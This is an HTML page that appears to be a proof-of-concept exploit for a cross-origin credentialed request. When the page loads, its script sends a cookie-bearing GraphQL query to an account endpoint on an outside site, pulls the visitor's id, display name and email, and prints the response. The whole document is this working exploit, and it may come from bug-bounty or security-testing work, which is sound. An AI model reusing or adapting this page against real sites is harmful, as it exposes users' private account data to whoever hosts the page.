<!DOCTYPE html>
<html>
    <body>
        <h3>Exploit Runningâ€¦</h3>
        <pre id="output"></pre>

        <script>
            function exploit() {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "https://breakme.getincentify.com/graphql?AccountQuery", true);

                // Required for browser to send cookies
                xhr.withCredentials = true;

                xhr.setRequestHeader("Content-Type", "application/json");

                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {
                        document.getElementById("output").textContent = 
                            "STATUS: " + xhr.status + "\n\n" + xhr.responseText;
                    }
                };

                var payload = {
                    query: `query AccountQuery {
                        me {
                            id
                            displayName
                            hasDiscoveryMap
                            isWorkOrdersEnabled
                            email
                        }
                    }`,
                    variables: {}
                };

                xhr.send(JSON.stringify(payload));
            }

            exploit();
        </script>
    </body>
</html>
